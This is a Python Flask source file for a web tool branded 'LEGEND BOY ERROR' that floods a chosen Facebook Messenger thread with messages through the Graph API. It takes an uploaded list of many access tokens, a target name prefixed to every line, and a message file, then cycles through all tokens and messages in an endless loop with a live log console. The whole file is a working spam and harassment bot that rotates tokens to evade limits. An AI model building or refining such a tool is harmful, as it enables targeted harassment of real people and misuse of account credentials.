from flask import Flask, request, Response, render_template_string
import requests
from threading import Thread, Event
import time
import json
from collections import deque
import threading

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

# Thread-safe log storage (last 100 messages)
log_lock = threading.Lock()
log_messages = deque(maxlen=100)

def log(message):
    with log_lock:
        log_messages.append(f"[{time.strftime('%H:%M:%S')}] {message}")

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        msg = f"SUCCESS | Token: {access_token[:10]}... | Msg: {message[:50]}"
                        print(msg)
                        log(msg)
                    else:
                        err = f"FAILED | Token: {access_token[:10]}... | {response.status_code} | {message[:50]}"
                        print(err)
                        log(err)
                except Exception as e:
                    err = f"ERROR | {str(e)[:60]}"
                    print(err)
                    log(err)
                time.sleep(time_interval)

# SSE Endpoint for Live Logs
@app.route('/logs')
def stream_logs():
    def event_stream():
        last_index = 0
        while True:
            with log_lock:
                if last_index < len(log_messages):
                    for i in range(last_index, len(log_messages)):
                        yield f"data: {log_messages[i]}\n\n"
                    last_index = len(log_messages)
            time.sleep(0.5)
    return Response(event_stream(), mimetype="text/event-stream")

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            with log_lock:
                log_messages.clear()
            log("Bot started...")
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))            
            thread.start()
            threads = [thread]  # Reset thread list

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>nonstop sever</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    body {
        background-image: url('https://i.imgur.com/92rqE1X.jpeg');
        background-size: cover;
        background-repeat: no-repeat;
        color: white;
        font-family: 'Courier New', monospace;
    }
    .container { max-width: 380px; padding: 20px; }
    .form-control {
        background: rgba(0,0,0,0.5); border: 1px solid white; color: white; border-radius: 10px;
    }
    .console {
        background: #000; color: #0f0; padding: 15px; border-radius: 10px; height: 200px; overflow-y: auto;
        font-size: 13px; margin-top: 20px; border: 1px solid #0f0; box-shadow: 0 0 10px #0f0;
    }
    .console::-webkit-scrollbar { width: 8px; }
    .console::-webkit-scrollbar-track { background: #111; }
    .console::-webkit-scrollbar-thumb { background: #0f0; border-radius: 4px; }
    .btn-submit { width: 100%; margin-top: 10px; }
  </style>
</head>
<body>
  <div class="container text-center">
    <h1 class="mt-3">LEGEND BOY ERROR</h1>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>SELECT YOUR TOKEN FILE</label>
        <input type="file" class="form-control" name="tokenFile" required>
      </div>
      <div class="mb-3">
        <label>CONVO GC/INBOX ID</label>
        <input type="text" class="form-control" name="threadId" required>
      </div>
      <div class="mb-3">
        <label>HATHE NAME</label>
        <input type="text" class="form-control" name="kidx" required>
      </div>
      <div class="mb-3">
        <label>TIME DELAY (seconds)</label>
        <input type="number" class="form-control" name="time" value="3" required>
      </div>
      <div class="mb-3">
        <label>TEXT FILE</label>
        <input type="file" class="form-control" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">START SENDING MESSAGES</button>
    </form>

    <form method="post" action="/stop" class="mt-2">
      <button type="submit" class="btn btn-danger btn-submit">STOP SENDING MESSAGES</button>
    </form>

    <!-- Live Console -->
    <div class="mt-4">
      <h5>LIVE CONSOLE</h5>
      <div id="console" class="console"></div>
    </div>
  </div>

  <script>
    const consoleDiv = document.getElementById('console');
    const eventSource = new EventSource('/logs');

    eventSource.onmessage = function(event) {
      const line = document.createElement('div');
      line.textContent = event.data;
      consoleDiv.appendChild(line);
      consoleDiv.scrollTop = consoleDiv.scrollHeight;
    };

    eventSource.onerror = function() {
      consoleDiv.innerHTML += '<div style="color:red;">[Connection lost. Reconnecting...]</div>';
    };
  </script>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    log("Bot stopped by user.")
    return 'Message sending stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
